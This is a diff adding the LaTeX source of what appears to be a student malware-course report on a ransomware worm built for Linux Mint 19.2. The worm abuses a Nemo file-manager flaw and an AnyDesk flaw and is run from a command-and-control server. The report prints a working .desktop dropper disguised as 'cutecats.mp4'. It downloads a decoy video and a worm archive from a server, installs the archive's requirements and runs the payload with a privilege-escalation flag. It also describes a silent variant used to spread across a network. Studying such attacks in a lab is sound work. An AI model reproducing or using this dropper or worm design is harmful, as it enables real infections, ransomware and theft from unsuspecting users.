@@ -1,0 +1,45 @@
+\section{Introduction}
+
+In today's world, updating your computer is no longer enough to protect yourself. Attackers are constantly coming up with new ideas and finding vulnerabilities in almost any software that they can exploit for their malicious purposes.
+
+This makes it all the more important for us, future cyber security professionals, to become familiar with the tools and vulnerabilities in order to be prepared. This project on the Malware subject is a good exercise for this purpose. Through this project, we were able to put ourselves in the position of a hacker, look for vulnerabilities and find creative ways to cause maximum damage to the fictitious victim with personal benefit for us.
+
+For our scenario, we decided to attack Linux Mint 19.2 (Cinnamon) and the remote access software Anydesk in version 5.5.2. Both are from 2019 and offer a perfect basis for our attack due to a vulnerability in the Linux kernel 4.10, a vulnerability in the Nemo file manager from this year and a vulnerability in this specific Anydesk version.
+
+We created a worm with several modules and accessed our infected victims via a command-and-control server. The worm infects a machine by clicking a \textit{.desktop} file that appears as a video. From there, we propagate to other machines and control them via our C2 server.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\section{Entry Points}
+
+For our entry into the system, we exploited a vulnerability in Nemo File Manager version 4.2.2. It is possible to hide the file extension of \textit{.desktop} files and display it as something else. To trick the victim, we disguised our \textit{.desktop} file as a \textit{.mp4} video inside a zip with other legit \textit{.mp4} files. When the victim clicks on the fake \textit{.mp4} file, it executes a sequence of bash instructions, which are:
+
+\begin{enumerate}[label=\textbf{\arabic*.}]
+    \item Create the virus folder (for now in the \textit{/home/} directory).
+    \item Request the real video from the server and play it.
+    \item While the video is playing, request from the server the \textit{.zip} file containing the worm in the background.
+    \item Unzip the worm.
+    \item Download and install all the requirements in the \textit{requirements.txt} file.
+    \item Execute the \textit{main.py} file in the background.
+\end{enumerate}
+
+In the case of the first script concerning \textit{"cutecats.mp4"}, the victim expects a video to play and thus we play it. For the infection of other machines in the network originating from the initial point, we used the vulnerability in the remote software AnyDesk, which will be discussed in more detail later in section \textbf{\ref{sec:network_propagation}}. In this case, we use a “silent script” since we don't want the victims to know they have been infected and they, of course, do not expect a video to play. The silent script that is sent to the victims infected through network propagation performs exactly the same steps, but without downloading and playing the video.
+
+The silent bash script will check if the machine is already infected by searching for a \textit{GR0up7.pem} file that our \textit{main.py} script creates at the beginning of its execution. This way, if the machine is already infected, it will break and not try to infect again. If this feature was not implemented, machines would repeatedly infect each other through network propagation.
+
+\begin{codesnippet}[H]
+    \caption{Bash cutecats.desktop}
+    \label{code:cutecats}
+\end{codesnippet}
+\vspace{-0.75cm}
+\begin{lstlisting}
+    #!/usr/bin/env xdg-open
+
+    [Desktop Entry]
+    Encoding=UTF-8
+    Name=cutecats.mp4
+    Exec=mkdir ransom-worm; cd ransom-worm; /usr/bin/wget -O cutecats.mp4 '10.0.2.15:8000/send_video'; /usr/bin/xdg-open cutecats.mp4; /usr/bin/wget -O ransom-worm.zip '10.0.2.15:8000/send_ransomworm'; /usr/bin/unzip ransom-worm.zip; python3 -m pip install -r requirements.txt; python3 main.py -m privesc;
+    Terminal=false
+    Type=Application
+    Icon=video-x-generic
+\end{lstlisting}
